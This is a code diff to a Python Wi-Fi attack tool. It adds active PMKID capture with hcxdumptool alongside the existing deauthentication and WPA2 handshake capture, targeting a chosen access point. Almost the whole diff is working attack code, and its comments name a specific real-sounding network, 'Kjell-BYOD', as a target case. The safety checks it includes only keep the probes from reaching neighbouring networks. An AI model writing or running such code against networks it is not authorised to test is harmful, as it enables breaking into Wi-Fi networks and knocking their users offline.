@@ -684,12 +684,185 @@ class WiFiScanner:
             logger.info(f"✓ Capturing {ssid} -> {os.path.basename(capture_file)}")
             
             # Send deauth after 5 seconds
-            threading.Thread(target=self._send_deauth_delayed, 
+            threading.Thread(target=self._send_deauth_delayed,
                            args=(bssid, channel), daemon=True).start()
-        
+
+            # Trigger active PMKID exchange in parallel. hcxdumptool sends
+            # association requests to the AP, which responds with EAPOL M1
+            # containing PMKID — captured by the airodump above without
+            # waiting for a real client. This is the modern path for
+            # client-less networks (e.g. Kjell-BYOD on a quiet weekend).
+            threading.Thread(target=self._trigger_pmkid,
+                           args=(bssid, ssid, channel), daemon=True).start()
+
         except Exception as e:
             logger.error(f"Failed to start capture for {ssid}: {e}", exc_info=True)
-    
+
+    @staticmethod
+    def _channel_to_hcx(channel: int) -> str:
+        """Format channel for hcxdumptool 6.3+ which requires a band suffix.
+
+        Band suffixes: a=2.4GHz, b=5GHz, c=6GHz, d=60GHz. We pick the
+        suffix from the channel number: the 802.11 channel ranges don't
+        overlap, so this is unambiguous.
+        """
+        if 1 <= channel <= 14:
+            return f"{channel}a"
+        if 32 <= channel <= 177:  # 5GHz: 36-165 typical, allow buffer
+            return f"{channel}b"
+        if channel <= 233:        # 6GHz (UNII-5..8)
+            return f"{channel}c"
+        return f"{channel}a"      # fallback — better than crashing
+
+    def _trigger_pmkid(self, bssid: str, ssid: str, channel: int):
+        """Run hcxdumptool against a single target to trigger PMKID exchange.
+
+        Why: WPA2 4-way handshake capture requires a client to (re)associate
+        after deauth — useless if the AP has no clients. PMKID, by contrast,
+        is in EAPOL M1 from the AP's side; hcxdumptool actively probes the
+        AP and the resulting M1 is broadcast on the channel where the
+        airodump capture (running in parallel on the monitor iface) records
+        it. The standard _check_handshake → hcxpcapngtool path then detects
+        the PMKID and saves the .cap as a normal handshake.
+
+        Why the attack iface (wlan1) and not the monitor (wlan0): the rtl
+        driver does not allow two processes to share the same monitor iface
+        for active operations — hcxdumptool fails with "driver is busy" if
+        airodump already has wlan0. The attack iface is otherwise idle
+        during capture (enumeration is gated by enumeration_active).
+
+        Safety: a compiled BPF filter (`wlan addr3 <bssid>`) restricts
+        hcxdumptool to frames from/to the target BSSID only. Combined with
+        the channel lock and the SSHGuard check on the iface, this keeps
+        active probes off neighbour APs and prevents a repeat of the
+        2026-04-25 first-boot incident. Do not remove the filter.
+        """
+        # Let airodump get oriented + first deauth burst land first.
+        # (15s = 5s deauth delay + 10s for clients-if-any to reassociate)
+        time.sleep(15)
+
+        if bssid not in self.active_captures:
+            return  # capture already finalized
+
+        # SAFETY: refuse to switch the iface mode if it carries SSH or is
+        # the management iface. Same gate the start() flow uses.
+        try:
+            self._ssh_guard.assert_safe_to_modify(
+                self.attack_interface, operation="enable monitor mode for PMKID"
+            )
+        except SafetyViolation as e:
+            logger.warning(f"PMKID probe skipped: {e}")
+            return
+
+        # Put attack iface in monitor mode if it isn't already. The
+        # enumerator will flip it back to managed when it next needs to
+        # associate, so we don't need to restore here.
+        try:
+            self._enable_monitor_mode(self.attack_interface)
+        except Exception as e:
+            logger.warning(f"PMKID probe skipped — monitor mode failed on {self.attack_interface}: {e}")
+            return
+
+        bssid_clean = bssid.replace(':', '').lower()
+        hcx_channel = self._channel_to_hcx(channel)
+
+        # Compile BPF filter via hcxdumptool itself (--bpfc emits the
+        # decimal "tcpdump -dd" format hcxdumptool expects). Run as a
+        # one-shot, capture its stdout, write to a temp file.
+        from .secure_io import secure_temp_config
+        bpf_path = secure_temp_config(f"pmkid_filter_{bssid_clean}", suffix=".bpf")
+        try:
+            bpfc = subprocess.run(
+                ['hcxdumptool', '--bpfc=wlan addr3 ' + bssid_clean],
+                capture_output=True, text=True, timeout=10,
+            )
+            if bpfc.returncode != 0 or not bpfc.stdout.strip():
+                logger.error(
+                    f"PMKID BPF compile failed for {ssid}: "
+                    f"rc={bpfc.returncode} stderr={bpfc.stderr.strip()[:200]}"
+                )
+                return
+            with open(bpf_path, 'w') as f:
+                f.write(bpfc.stdout)
+        except FileNotFoundError:
+            logger.warning(
+                "hcxdumptool not installed — PMKID attack disabled. "
+                "Install: sudo apt install hcxdumptool"
+            )
+            return
+        except (OSError, subprocess.TimeoutExpired) as e:
+            logger.error(f"PMKID BPF compile error for {ssid}: {e}")
+            return
+
+        # Throwaway pcap — the airodump capture on the same iface/channel
+        # records the same M1 frames, so we don't need this file's contents.
+        pmkid_pcap = f"/tmp/pendonn_pmkid_{bssid_clean}_{int(time.time())}.pcapng"
+
+        cmd = [
+            'hcxdumptool',
+            '-i', self.attack_interface,        # idle during capture; wlan0 is busy with airodump
+            '-c', hcx_channel,                  # e.g. "4a" for CH 4 / 2.4GHz
+            '-w', pmkid_pcap,
+            '--disable_deauthentication',       # aireplay handles deauth on wlan0
+            '--bpf=' + bpf_path,                # scope to target BSSID
+            '--exitoneapol=1',                  # exit immediately on PMKID
+        ]
+
+        try:
+            logger.info(f"🎯 PMKID probe starting for {ssid} ({bssid}) CH:{hcx_channel}")
+            proc = subprocess.Popen(cmd,
+                                    stdout=subprocess.DEVNULL,
+                                    stderr=subprocess.PIPE)
+
+            # 25-second active probe window. hcxdumptool exits early via
+            # --exitoneapol=1 if PMKID is captured.
+            probe_window = 25
+            start = time.time()
+            while time.time() - start < probe_window:
+                if proc.poll() is not None:
+                    break
+                time.sleep(2)
+                if bssid not in self.active_captures:
+                    break  # main capture finalized; stop probing
+
+            if proc.poll() is None:
+                proc.terminate()
+                try:
+                    proc.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+
+            # Surface stderr on non-zero exit so version mismatches don't
+            # fail silently again like they did the first time.
+            rc = proc.returncode
+            stderr_tail = ''
+            if proc.stderr:
+                try:
+                    stderr_tail = proc.stderr.read().decode('utf-8', 'replace')[-400:]
+                except Exception:
+                    pass
+            if rc not in (0, None) and rc not in (-15, -9):  # 15=SIGTERM, 9=SIGKILL
+                logger.warning(
+                    f"PMKID probe for {ssid} exited rc={rc} stderr={stderr_tail.strip()}"
+                )
+            else:
+                logger.info(f"✓ PMKID probe complete for {ssid}")
+
+        except FileNotFoundError:
+            logger.warning(
+                "hcxdumptool not installed — PMKID attack disabled. "
+                "Install: sudo apt install hcxdumptool"
+            )
+        except Exception as e:
+            logger.debug(f"PMKID probe error for {ssid}: {e}")
+        finally:
+            for path in (pmkid_pcap, bpf_path):
+                try:
+                    if os.path.exists(path):
+                        os.remove(path)
+                except OSError:
+                    pass
+
     def _send_deauth_delayed(self, bssid: str, channel: int):
         """Send deauth packets after delay"""
         time.sleep(5)
